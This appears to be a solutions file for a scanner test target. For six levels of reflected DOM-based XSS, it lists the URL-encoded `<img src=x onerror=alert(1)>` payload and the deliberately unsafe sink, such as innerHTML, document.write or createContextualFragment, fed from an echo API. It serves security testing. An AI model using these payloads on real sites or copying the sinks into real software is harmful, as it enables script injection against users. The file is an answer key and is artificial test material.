# apidom — solutions

Reflected DOM XSS via client-side API responses (the modern SPA shape). Each
`/apidom/levelN/` page reads the URL `q`, fetches its companion
`/apidom/levelN/api?q=...` echo route, and drops the response into an HTML
sink. The API alone returns a correct content type (json/plain) and is **not**
XSS on its own — the bug exists only end-to-end, so it triggers on a single
navigation in a JS-executing (headless) scanner.

All levels use the same payload `<img src=x onerror=alert(1)>` in `q`.

### apidom-level1

`/apidom/level1/?q=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: `fetch(api).then(r => r.text())` → `out.innerHTML = t`. API echoes
  `q` as `text/plain`.

### apidom-level2

`/apidom/level2/?q=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: `fetch(api).then(r => r.json())` → `card.innerHTML = d.html`. API
  returns `{"html": q}` as `application/json`.

### apidom-level3

`/apidom/level3/?q=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: `XMLHttpRequest` GET → `out.innerHTML = xhr.responseText`. API echoes
  `q` inside a `<span>`.

### apidom-level4

`/apidom/level4/?q=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: `fetch(api).then(r => r.json())` → `feed.insertAdjacentHTML('beforeend',
  '<li>' + d.msg + '</li>')`. API returns `{"msg": q}`.

### apidom-level5

`/apidom/level5/?q=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: `fetch(api).then(r => r.text())` → `document.write(t)`. API echoes a
  `<div>` wrapping `q`.

### apidom-level6

`/apidom/level6/?q=%3Cimg%20src=x%20onerror=alert(1)%3E`

- payload: `<img src=x onerror=alert(1)>`
- context: `fetch(api).then(r => r.text())` → `createContextualFragment(t)` →
  `out.appendChild(frag)`. API echoes a `<section>` wrapping `q`.
